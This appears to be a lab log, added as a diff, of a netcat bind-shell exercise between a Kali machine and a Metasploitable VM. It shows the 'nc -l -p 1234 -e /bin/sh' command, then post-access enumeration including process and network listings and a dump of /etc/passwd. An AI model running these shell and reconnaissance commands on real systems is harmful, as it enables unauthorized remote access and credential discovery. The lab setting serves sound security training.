@@ -1,0 +1,316 @@
+# Macchina Meta
+msfadmin@metasploitable:/home$ nc -l -p 1234 -e /bin/sh
+msfadmin@metasploitable:/home$ 
+# Macchina Kali                                                                                                  
+┌──(kali㉿kali)-[~]
+└─$ nc 192.168.32.102 1234
+uname -a
+Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux
+cat /proc/cpuinfo
+processor       : 0
+vendor_id       : GenuineIntel
+cpu family      : 6
+model           : 140
+model name      : 11th Gen Intel(R) Core(TM) i7-11390H @ 3.40GHz
+stepping        : 2
+cpu MHz         : 2917.612
+cache size      : 12288 KB
+physical id     : 0
+siblings        : 2
+core id         : 0
+cpu cores       : 2
+fdiv_bug        : no
+hlt_bug         : no
+f00f_bug        : no
+coma_bug        : no
+fpu             : yes
+fpu_exception   : yes
+cpuid level     : 22
+wp              : yes
+flags           : fpu vme de pse tsc msr pae mce cx8 apic sep mtrr pge mca cmov pat pse36 clflush mmx fxsr sse sse2 ht nx rdtscp lm constant_tsc pni ssse3 cx16 sse4_1 sse4_2 popcnt lahf_lm abm 3dnowprefetch
+bogomips        : 5743.81
+clflush size    : 64
+
+processor       : 1
+vendor_id       : GenuineIntel
+cpu family      : 6
+model           : 140
+model name      : 11th Gen Intel(R) Core(TM) i7-11390H @ 3.40GHz
+stepping        : 2
+cpu MHz         : 2917.612
+cache size      : 12288 KB
+physical id     : 0
+siblings        : 2
+core id         : 1
+cpu cores       : 2
+fdiv_bug        : no
+hlt_bug         : no
+f00f_bug        : no
+coma_bug        : no
+fpu             : yes
+fpu_exception   : yes
+cpuid level     : 22
+wp              : yes
+flags           : fpu vme de pse tsc msr pae mce cx8 apic sep mtrr pge mca cmov pat pse36 clflush mmx fxsr sse sse2 ht nx rdtscp lm constant_tsc pni ssse3 cx16 sse4_1 sse4_2 popcnt lahf_lm abm 3dnowprefetch
+bogomips        : 6135.44
+clflush size    : 64
+
+pwd
+/home
+ls -la
+total 24
+drwxr-xr-x  6 root     root     4096 2010-04-16 02:16 .
+drwxr-xr-x 21 root     root     4096 2012-05-20 14:36 ..
+drwxr-xr-x  2 root     nogroup  4096 2010-03-17 10:08 ftp
+drwxr-xr-x  5 msfadmin msfadmin 4096 2012-05-20 14:22 msfadmin
+drwxr-xr-x  2 service  service  4096 2010-04-16 02:16 service
+drwxr-xr-x  3 user     user     4096 2010-05-07 14:38 user
+cd msfadmin
+ls -la
+total 36
+drwxr-xr-x 5 msfadmin msfadmin 4096 2012-05-20 14:22 .
+drwxr-xr-x 6 root     root     4096 2010-04-16 02:16 ..
+lrwxrwxrwx 1 root     root        9 2012-05-14 00:26 .bash_history -> /dev/null
+drwxr-xr-x 4 msfadmin msfadmin 4096 2010-04-17 14:11 .distcc
+-rw------- 1 root     root     4174 2012-05-14 02:01 .mysql_history
+-rw-r--r-- 1 msfadmin msfadmin  586 2010-03-16 19:12 .profile
+-rwx------ 1 msfadmin msfadmin    4 2012-05-20 14:22 .rhosts
+drwx------ 2 msfadmin msfadmin 4096 2010-05-17 21:43 .ssh
+-rw-r--r-- 1 msfadmin msfadmin    0 2010-05-07 14:38 .sudo_as_admin_successful
+drwxr-xr-x 6 msfadmin msfadmin 4096 2010-04-27 23:44 vulnerable
+ps aux
+USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
+root         1  0.0  0.0   2844  1696 ?        Ss   16:27   0:01 /sbin/init
+root         2  0.0  0.0      0     0 ?        S<   16:27   0:00 [kthreadd]
+root         3  0.0  0.0      0     0 ?        S<   16:27   0:00 [migration/0]
+root         4  0.0  0.0      0     0 ?        S<   16:27   0:00 [ksoftirqd/0]
+root         5  0.0  0.0      0     0 ?        S<   16:27   0:00 [watchdog/0]
+root         6  0.0  0.0      0     0 ?        S<   16:27   0:00 [migration/1]
+root         7  0.0  0.0      0     0 ?        S<   16:27   0:00 [ksoftirqd/1]
+root         8  0.0  0.0      0     0 ?        S<   16:27   0:00 [watchdog/1]
+root         9  0.0  0.0      0     0 ?        S<   16:27   0:00 [events/0]
+root        10  0.0  0.0      0     0 ?        S<   16:27   0:00 [events/1]
+root        11  0.0  0.0      0     0 ?        S<   16:27   0:00 [khelper]
+root        46  0.0  0.0      0     0 ?        S<   16:27   0:00 [kblockd/0]
+root        47  0.0  0.0      0     0 ?        S<   16:27   0:00 [kblockd/1]
+root        50  0.0  0.0      0     0 ?        S<   16:27   0:00 [kacpid]
+root        51  0.0  0.0      0     0 ?        S<   16:27   0:00 [kacpi_notify]
+root        98  0.0  0.0      0     0 ?        S<   16:27   0:00 [kseriod]
+root       142  0.0  0.0      0     0 ?        S    16:27   0:00 [pdflush]
+root       143  0.0  0.0      0     0 ?        S    16:27   0:00 [pdflush]
+root       144  0.0  0.0      0     0 ?        S<   16:27   0:00 [kswapd0]
+root       186  0.0  0.0      0     0 ?        S<   16:27   0:00 [aio/0]
+root       187  0.0  0.0      0     0 ?        S<   16:27   0:00 [aio/1]
+root      1154  0.0  0.0      0     0 ?        S<   16:27   0:00 [ksnapd]
+root      1306  0.0  0.0      0     0 ?        S<   16:27   0:00 [ata/0]
+root      1307  0.0  0.0      0     0 ?        S<   16:27   0:00 [ata/1]
+root      1308  0.0  0.0      0     0 ?        S<   16:27   0:00 [ata_aux]
+root      1315  0.0  0.0      0     0 ?        S<   16:27   0:00 [scsi_eh_0]
+root      1316  0.0  0.0      0     0 ?        S<   16:27   0:00 [scsi_eh_1]
+root      1381  0.0  0.0      0     0 ?        S<   16:27   0:00 [ksuspend_usbd]
+root      1383  0.0  0.0      0     0 ?        S<   16:27   0:00 [khubd]
+root      2109  0.0  0.0      0     0 ?        S<   16:28   0:00 [scsi_eh_2]
+root      2273  0.0  0.0      0     0 ?        S<   16:28   0:00 [kjournald]
+root      2427  0.0  0.0   2092   620 ?        S<s  16:28   0:00 /sbin/udevd --daemon
+root      2679  0.0  0.0      0     0 ?        S<   16:28   0:00 [kpsmoused]
+root      3592  0.0  0.0      0     0 ?        S<   16:28   0:00 [kjournald]
+daemon    3724  0.0  0.0   1836   528 ?        Ss   16:28   0:00 /sbin/portmap
+statd     3740  0.0  0.0   1900   724 ?        Ss   16:28   0:00 /sbin/rpc.statd
+root      3748  0.0  0.0      0     0 ?        S<   16:28   0:00 [rpciod/0]
+root      3749  0.0  0.0      0     0 ?        S<   16:28   0:00 [rpciod/1]
+root      3766  0.0  0.0   3648   564 ?        Ss   16:28   0:00 /usr/sbin/rpc.idmapd
+root      3993  0.0  0.0   1716   492 tty4     Ss+  16:28   0:00 /sbin/getty 38400 tty4
+root      3994  0.0  0.0   1716   492 tty5     Ss+  16:28   0:00 /sbin/getty 38400 tty5
+root      3999  0.0  0.0   1716   488 tty2     Ss+  16:28   0:00 /sbin/getty 38400 tty2
+root      4003  0.0  0.0   1716   492 tty3     Ss+  16:28   0:00 /sbin/getty 38400 tty3
+root      4009  0.0  0.0   1716   492 tty6     Ss+  16:28   0:00 /sbin/getty 38400 tty6
+syslog    4042  0.0  0.0   1936   648 ?        Ss   16:28   0:00 /sbin/syslogd -u syslog
+root      4077  0.0  0.0   1872   544 ?        S    16:28   0:00 /bin/dd bs 1 if /proc/kmsg of /var/run/klogd/kmsg
+klog      4079  0.0  0.1   3284  2092 ?        Ss   16:28   0:00 /sbin/klogd -P /var/run/klogd/kmsg
+bind      4102  0.0  0.4  44384  8464 ?        Ssl  16:28   0:00 /usr/sbin/named -u bind
+root      4208  0.0  0.0   2768  1304 ?        S    16:28   0:00 /bin/sh /usr/bin/mysqld_safe
+mysql     4250  0.0  0.8 127560 17024 ?        Sl   16:28   0:00 /usr/sbin/mysqld --basedir=/usr --datadir=/var/lib/mysql --user=mysql --pid-file=/var/run/mysqld/mysqld.pid --skip-external-locking --port=3306 --socket=/var/run/mysqld/mysqld.sock
+root      4252  0.0  0.0   1700   556 ?        S    16:28   0:00 logger -p daemon.err -t mysqld_safe -i -t mysqld
+postgres  4328  0.0  0.2  41340  5076 ?        S    16:28   0:00 /usr/lib/postgresql/8.3/bin/postgres -D /var/lib/postgresql/8.3/main -c config_file=/etc/postgresql/8.3/main/postgresql.conf
+postgres  4331  0.0  0.0  41340  1384 ?        Ss   16:28   0:00 postgres: writer process                                                                                                    
+postgres  4332  0.0  0.0  41340  1196 ?        Ss   16:28   0:00 postgres: wal writer process                                                                                                
+postgres  4333  0.0  0.0  41476  1412 ?        Ss   16:28   0:00 postgres: autovacuum launcher process                                                                                       
+postgres  4334  0.0  0.0  12660  1160 ?        Ss   16:28   0:00 postgres: stats collector process                                                                                           
+daemon    4354  0.0  0.0   2316   428 ?        SNs  16:28   0:00 distccd --daemon --user daemon --allow 0.0.0.0/0
+daemon    4355  0.0  0.0   2316   220 ?        SN   16:28   0:00 distccd --daemon --user daemon --allow 0.0.0.0/0
+root      4407  0.0  0.0      0     0 ?        S    16:28   0:00 [lockd]
+root      4408  0.0  0.0      0     0 ?        S<   16:28   0:00 [nfsd4]
+root      4409  0.0  0.0      0     0 ?        S    16:28   0:00 [nfsd]
+root      4410  0.0  0.0      0     0 ?        S    16:28   0:00 [nfsd]
+root      4411  0.0  0.0      0     0 ?        S    16:28   0:00 [nfsd]
+root      4412  0.0  0.0      0     0 ?        S    16:28   0:00 [nfsd]
+root      4413  0.0  0.0      0     0 ?        S    16:28   0:00 [nfsd]
+root      4414  0.0  0.0      0     0 ?        S    16:28   0:00 [nfsd]
+root      4415  0.0  0.0      0     0 ?        S    16:28   0:00 [nfsd]
+root      4416  0.0  0.0      0     0 ?        S    16:28   0:00 [nfsd]
+root      4420  0.0  0.0   2424   328 ?        Ss   16:28   0:00 /usr/sbin/rpc.mountd
+root      4486  0.0  0.0   5412  1736 ?        Ss   16:28   0:00 /usr/lib/postfix/master
+root      4493  0.0  0.0   5388  1204 ?        Ss   16:28   0:00 /usr/sbin/nmbd -D
+root      4495  0.0  0.0   7724  1364 ?        Ss   16:28   0:00 /usr/sbin/smbd -D
+root      4499  0.0  0.0   7724   812 ?        S    16:28   0:00 /usr/sbin/smbd -D
+root      4514  0.0  0.0   2424   856 ?        Ss   16:28   0:00 /usr/sbin/xinetd -pidfile /var/run/xinetd.pid -stayalive -inetd_compat
+proftpd   4550  0.0  0.0   9948  1596 ?        Ss   16:28   0:00 proftpd: (accepting connections)
+daemon    4564  0.0  0.0   1984   420 ?        Ss   16:28   0:00 /usr/sbin/atd
+root      4575  0.0  0.0   2104   892 ?        Ss   16:28   0:00 /usr/sbin/cron
+daemon    4587  0.0  0.0   2316   220 ?        SN   16:28   0:00 distccd --daemon --user daemon --allow 0.0.0.0/0
+root      4604  0.0  0.0   2052   348 ?        Ss   16:28   0:00 /usr/bin/jsvc -user tomcat55 -cp /usr/share/java/commons-daemon.jar:/usr/share/tomcat5.5/bin/bootstrap.jar -outfile SYSLOG -errfile SYSLOG -pidfile /var/run/tomcat5.5.pid -Djava.awt.headless=true -Xmx128M -Djava.endorsed.dirs=/usr/share/tomcat5.5/common/endorsed -Dcatalina.base=/var/lib/tomcat5.5 -Dcatalina.home=/usr/share/tomcat5.5 -Djava.io.tmpdir=/var/lib/tomcat5.5/temp -Djava.security.manager -Djava.security.policy=/var/lib/tomcat5.5/conf/catalina.policy org.apache.catalina.startup.Bootstrap
+root      4605  0.0  0.0   2052   476 ?        S    16:28   0:00 /usr/bin/jsvc -user tomcat55 -cp /usr/share/java/commons-daemon.jar:/usr/share/tomcat5.5/bin/bootstrap.jar -outfile SYSLOG -errfile SYSLOG -pidfile /var/run/tomcat5.5.pid -Djava.awt.headless=true -Xmx128M -Djava.endorsed.dirs=/usr/share/tomcat5.5/common/endorsed -Dcatalina.base=/var/lib/tomcat5.5 -Dcatalina.home=/usr/share/tomcat5.5 -Djava.io.tmpdir=/var/lib/tomcat5.5/temp -Djava.security.manager -Djava.security.policy=/var/lib/tomcat5.5/conf/catalina.policy org.apache.catalina.startup.Bootstrap
+tomcat55  4607  0.5  4.3 366208 90864 ?        Sl   16:28   0:05 /usr/bin/jsvc -user tomcat55 -cp /usr/share/java/commons-daemon.jar:/usr/share/tomcat5.5/bin/bootstrap.jar -outfile SYSLOG -errfile SYSLOG -pidfile /var/run/tomcat5.5.pid -Djava.awt.headless=true -Xmx128M -Djava.endorsed.dirs=/usr/share/tomcat5.5/common/endorsed -Dcatalina.base=/var/lib/tomcat5.5 -Dcatalina.home=/usr/share/tomcat5.5 -Djava.io.tmpdir=/var/lib/tomcat5.5/temp -Djava.security.manager -Djava.security.policy=/var/lib/tomcat5.5/conf/catalina.policy org.apache.catalina.startup.Bootstrap
+root      4625  0.0  0.1  10596  2556 ?        Ss   16:28   0:00 /usr/sbin/apache2 -k start
+www-data  4626  0.0  0.0  10596  1948 ?        S    16:28   0:00 /usr/sbin/apache2 -k start
+www-data  4627  0.0  0.0  10596  1948 ?        S    16:28   0:00 /usr/sbin/apache2 -k start
+www-data  4629  0.0  0.0  10596  1948 ?        S    16:28   0:00 /usr/sbin/apache2 -k start
+www-data  4630  0.0  0.0  10596  1948 ?        S    16:28   0:00 /usr/sbin/apache2 -k start
+www-data  4634  0.0  0.0  10596  1948 ?        S    16:28   0:00 /usr/sbin/apache2 -k start
+root      4644  0.0  1.2  66344 26464 ?        Sl   16:28   0:00 /usr/bin/rmiregistry
+root      4648  0.0  0.1  12208  2568 ?        Sl   16:28   0:00 ruby /usr/sbin/druby_timeserver.rb
+root      4656  0.0  0.0   2568  1200 tty1     Ss   16:28   0:00 /bin/login --         
+root      4657  0.0  0.1   8540  2368 ?        S    16:28   0:00 /usr/bin/unrealircd
+root      4665  0.0  0.5  13924 12008 ?        S    16:28   0:00 Xtightvnc :0 -desktop X -auth /root/.Xauthority -geometry 1024x768 -depth 24 -rfbwait 120000 -rfbauth /root/.vnc/passwd -rfbport 5900 -fp /usr/X11R6/lib/X11/fonts/Type1/,/usr/X11R6/lib/X11/fonts/Speedo/,/usr/X11R6/lib/X11/fonts/misc/,/usr/X11R6/lib/X11/fonts/75dpi/,/usr/X11R6/lib/X11/fonts/100dpi/,/usr/share/fonts/X11/misc/,/usr/share/fonts/X11/Type1/,/usr/share/fonts/X11/75dpi/,/usr/share/fonts/X11/100dpi/ -co /etc/X11/rgb
+daemon    4669  0.0  0.0   2316   220 ?        SN   16:28   0:00 distccd --daemon --user daemon --allow 0.0.0.0/0
+root      4675  0.0  0.0   2724  1188 ?        S    16:28   0:00 /bin/sh /root/.vnc/xstartup
+root      4678  0.0  0.1   5936  2576 ?        S    16:28   0:00 xterm -geometry 80x24+10+10 -ls -title X Desktop
+root      4680  0.0  0.2   8988  4992 ?        S    16:28   0:00 fluxbox
+daemon    4684  0.0  0.0   2316   220 ?        SN   16:28   0:00 distccd --daemon --user daemon --allow 0.0.0.0/0
+root      4707  0.0  0.0   2852  1544 pts/0    Ss+  16:28   0:00 -bash
+msfadmin  4760  0.0  0.0   4624  2016 tty1     S    16:28   0:00 -bash
+dhcp      4767  0.0  0.0   2436   704 ?        S<s  16:29   0:00 dhclient3 -e IF_METRIC=100 -pf /var/run/dhclient.eth0.pid -lf /var/lib/dhcp3/dhclient.eth0.leases eth0
+root      4864  0.0  0.0   5312   992 ?        Ss   16:29   0:00 /usr/sbin/sshd
+postfix   4879  0.0  0.0   5460  1680 ?        S    16:29   0:00 qmgr -l -t fifo -u
+postfix   4881  0.0  0.0   5420  1644 ?        S    16:29   0:00 pickup -l -t fifo -u -c
+msfadmin  4969  0.0  0.0   4264  1444 tty1     S+   16:45   0:00 sh
+msfadmin  4978  0.0  0.0   2644  1004 tty1     R+   16:47   0:00 ps aux
+netstat
+Active Internet connections (w/o servers)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State      
+tcp        0      0 192.168.32.102:1234     192.168.32.100:41994    ESTABLISHED
+udp        0      0 localhost:43569         localhost:43569         ESTABLISHED
+Active UNIX domain sockets (w/o servers)
+Proto RefCnt Flags       Type       State         I-Node   Path
+unix  2      [ ]         DGRAM                    5822     @/com/ubuntu/upstart
+unix  2      [ ]         DGRAM                    6056     @/org/kernel/udev/udevd
+unix  14     [ ]         DGRAM                    10971    /dev/log
+unix  2      [ ]         DGRAM                    13039    
+unix  2      [ ]         DGRAM                    13029    
+unix  3      [ ]         STREAM     CONNECTED     13022    
+unix  3      [ ]         STREAM     CONNECTED     13021    
+unix  3      [ ]         STREAM     CONNECTED     13020    
+unix  3      [ ]         STREAM     CONNECTED     13019    
+unix  3      [ ]         STREAM     CONNECTED     13018    
+unix  3      [ ]         STREAM     CONNECTED     13017    
+unix  3      [ ]         STREAM     CONNECTED     13016    
+unix  3      [ ]         STREAM     CONNECTED     13015    
+unix  3      [ ]         STREAM     CONNECTED     13014    
+unix  3      [ ]         STREAM     CONNECTED     13013    
+unix  3      [ ]         STREAM     CONNECTED     13012    
+unix  3      [ ]         STREAM     CONNECTED     13011    
+unix  3      [ ]         STREAM     CONNECTED     13010    
+unix  3      [ ]         STREAM     CONNECTED     13009    
+unix  3      [ ]         STREAM     CONNECTED     13008    
+unix  3      [ ]         STREAM     CONNECTED     13007    
+unix  3      [ ]         STREAM     CONNECTED     13006    
+unix  3      [ ]         STREAM     CONNECTED     13005    
+unix  3      [ ]         STREAM     CONNECTED     13004    
+unix  3      [ ]         STREAM     CONNECTED     13003    
+unix  3      [ ]         STREAM     CONNECTED     13002    
+unix  3      [ ]         STREAM     CONNECTED     13001    
+unix  3      [ ]         STREAM     CONNECTED     13000    
+unix  3      [ ]         STREAM     CONNECTED     12999    
+unix  3      [ ]         STREAM     CONNECTED     12998    
+unix  3      [ ]         STREAM     CONNECTED     12997    
+unix  3      [ ]         STREAM     CONNECTED     12996    
+unix  3      [ ]         STREAM     CONNECTED     12995    
+unix  3      [ ]         STREAM     CONNECTED     12994    
+unix  3      [ ]         STREAM     CONNECTED     12993    
+unix  3      [ ]         STREAM     CONNECTED     12992    
+unix  3      [ ]         STREAM     CONNECTED     12991    
+unix  3      [ ]         STREAM     CONNECTED     12990    
+unix  3      [ ]         STREAM     CONNECTED     12989    
+unix  3      [ ]         STREAM     CONNECTED     12988    
+unix  3      [ ]         STREAM     CONNECTED     12987    
+unix  3      [ ]         STREAM     CONNECTED     12986    
+unix  3      [ ]         STREAM     CONNECTED     12985    
+unix  3      [ ]         STREAM     CONNECTED     12984    
+unix  3      [ ]         STREAM     CONNECTED     12983    
+unix  3      [ ]         STREAM     CONNECTED     12982    
+unix  3      [ ]         STREAM     CONNECTED     12981    
+unix  3      [ ]         STREAM     CONNECTED     12980    
+unix  3      [ ]         STREAM     CONNECTED     12979    
+unix  3      [ ]         STREAM     CONNECTED     12978    
+unix  3      [ ]         STREAM     CONNECTED     12977    
+unix  3      [ ]         STREAM     CONNECTED     12976    
+unix  3      [ ]         STREAM     CONNECTED     12975    
+unix  3      [ ]         STREAM     CONNECTED     12974    
+unix  3      [ ]         STREAM     CONNECTED     12973    
+unix  3      [ ]         STREAM     CONNECTED     12972    
+unix  3      [ ]         STREAM     CONNECTED     12971    
+unix  3      [ ]         STREAM     CONNECTED     12970    
+unix  3      [ ]         STREAM     CONNECTED     12969    
+unix  3      [ ]         STREAM     CONNECTED     12968    
+unix  3      [ ]         STREAM     CONNECTED     12967    
+unix  3      [ ]         STREAM     CONNECTED     12966    
+unix  3      [ ]         STREAM     CONNECTED     12965    
+unix  3      [ ]         STREAM     CONNECTED     12964    
+unix  3      [ ]         STREAM     CONNECTED     12963    
+unix  2      [ ]         DGRAM                    12401    
+unix  3      [ ]         STREAM     CONNECTED     12308    /tmp/.X11-unix/X0
+unix  3      [ ]         STREAM     CONNECTED     12307    
+unix  3      [ ]         STREAM     CONNECTED     12306    /tmp/.X11-unix/X0
+unix  3      [ ]         STREAM     CONNECTED     12305    
+unix  2      [ ]         DGRAM                    12280    
+unix  2      [ ]         DGRAM                    12229    
+unix  2      [ ]         DGRAM                    12024    
+unix  2      [ ]         DGRAM                    11815    
+unix  2      [ ]         DGRAM                    11533    
+unix  2      [ ]         DGRAM                    11507    
+unix  2      [ ]         DGRAM                    11280    
+unix  2      [ ]         DGRAM                    11067    
+unix  2      [ ]         DGRAM                    11038    
+unix  3      [ ]         STREAM     CONNECTED     10291    
+unix  3      [ ]         STREAM     CONNECTED     10290    
+cat /etc/passwd           
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/bin/sh
+bin:x:2:2:bin:/bin:/bin/sh
+sys:x:3:3:sys:/dev:/bin/sh
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/bin/sh
+man:x:6:12:man:/var/cache/man:/bin/sh
+lp:x:7:7:lp:/var/spool/lpd:/bin/sh
+mail:x:8:8:mail:/var/mail:/bin/sh
+news:x:9:9:news:/var/spool/news:/bin/sh
+uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
+proxy:x:13:13:proxy:/bin:/bin/sh
+www-data:x:33:33:www-data:/var/www:/bin/sh
+backup:x:34:34:backup:/var/backups:/bin/sh
+list:x:38:38:Mailing List Manager:/var/list:/bin/sh
+irc:x:39:39:ircd:/var/run/ircd:/bin/sh
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
+nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
+libuuid:x:100:101::/var/lib/libuuid:/bin/sh
+dhcp:x:101:102::/nonexistent:/bin/false
+syslog:x:102:103::/home/syslog:/bin/false
+klog:x:103:104::/home/klog:/bin/false
+sshd:x:104:65534::/var/run/sshd:/usr/sbin/nologin
+msfadmin:x:1000:1000:msfadmin,,,:/home/msfadmin:/bin/bash
+bind:x:105:113::/var/cache/bind:/bin/false
+postfix:x:106:115::/var/spool/postfix:/bin/false
+ftp:x:107:65534::/home/ftp:/bin/false
+postgres:x:108:117:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
+mysql:x:109:118:MySQL Server,,,:/var/lib/mysql:/bin/false
+tomcat55:x:110:65534::/usr/share/tomcat5.5:/bin/false
+distccd:x:111:65534::/:/bin/false
+user:x:1001:1001:just a user,111,,:/home/user:/bin/bash
+service:x:1002:1002:,,,:/home/service:/bin/bash
+telnetd:x:112:120::/nonexistent:/bin/false
+proftpd:x:113:65534::/var/run/proftpd:/bin/false
+statd:x:114:65534::/var/lib/nfs:/bin/false
+^C
+                                                                                                 
+┌──(kali㉿kali)-[~]
+└─$ 
